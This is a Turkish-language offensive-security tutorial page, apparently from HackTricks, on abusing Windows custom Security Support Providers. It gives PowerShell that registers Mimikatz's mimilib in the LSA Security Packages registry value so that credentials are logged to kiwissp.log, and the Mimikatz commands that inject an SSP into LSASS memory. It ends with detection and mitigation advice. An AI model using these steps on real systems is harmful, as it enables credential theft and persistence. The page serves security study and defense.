# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSP'ler)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi), Local Security Authority (LSA) tarafından yüklenen DLL tabanlı güvenlik paketleridir. Windows, özel SSP/AP DLL'lerini `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` `REG_MULTI_SZ` değeri üzerinden kaydeder ve sistem başlatıldığında kayıtlı paketleri yükler.<sup>[[1]](#references)</sup>

SSP'ler LSA içinde çalışabildiğinden ve kimlik bilgilerini alabileceğinden, saldırganlar kötü amaçlı bir paketi credential access ve persistence amacıyla kötüye kullanabilir. MITRE bu davranışı T1547.005 olarak izler.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz, yüklendikten sonra işlenen kimlik bilgilerini kaydeden bir SSP uygulayan `mimilib.dll` dosyasını içerir. Yetkili bir lab ortamında hedef mimariyle eşleşen DLL'yi `C:\Windows\System32` konumuna yerleştirin, ardından değiştirmeden önce mevcut paket listesini inceleyin.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Tipik bir mevcut değer `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` ve `pku2u` gibi paketler içerebilir. Özel paketi eklerken mevcut her girdiyi koruyun.<sup>[[1]](#references)</sup>

Mevcut paketleri değiştirmeden `mimilib` ekleyin:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Yeniden başlatmanın ardından paket LSA'ya yüklenir ve bu implementation tarafından yakalanan sonraki kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasına yazılır.<sup>[[2]](#references)[[3]](#references)</sup>

## Bellek İçi Yükleme

Mimikatz ayrıca SSP implementation'ını mevcut LSASS işlemine inject edebilir:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Bu yöntem yeniden başlatma sonrasında kalıcı olmaz.<sup>[[2]](#references)[[3]](#references)</sup>

## Tespit ve Azaltma

`...\Lsa\Security Packages` üzerindeki değişiklikleri ve `lsass.exe` içine beklenmeyen DLL yüklemelerini izleyin. Security event 4657, yalnızca ilgili Audit Registry policy ve SACL yapılandırıldığında bir registry **value** değişikliğini kaydeder.<sup>[[2]](#references)[[4]](#references)</sup>

Uyumlu olduğu durumlarda ek LSA protection özelliğini etkinleştirin ve imzasız veya beklenmeyen SSP DLL'lerini araştırın. Microsoft, LSA protection özelliğini kimlik bilgilerini tehlikeye atabilecek code injection saldırılarına karşı özel olarak bir güvenlik önlemi olarak belgeler.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - SSP/AP DLL'lerini kaydetme](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Mimikatz repository - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Security event 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Ek LSA protection özelliğini yapılandırma](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
